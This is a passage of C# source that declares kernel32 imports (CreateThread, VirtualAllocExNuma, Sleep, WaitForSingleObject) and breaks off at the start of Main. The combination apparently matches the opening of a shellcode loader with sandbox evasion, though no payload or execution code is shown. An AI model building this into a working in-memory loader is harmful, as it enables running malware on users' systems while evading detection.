        [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
        [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
        [DllImport("kernel32.dll")] static extern void Sleep(uint ms);
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocExNuma(IntPtr h, IntPtr a, uint s, uint t, uint p, uint n);
        [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
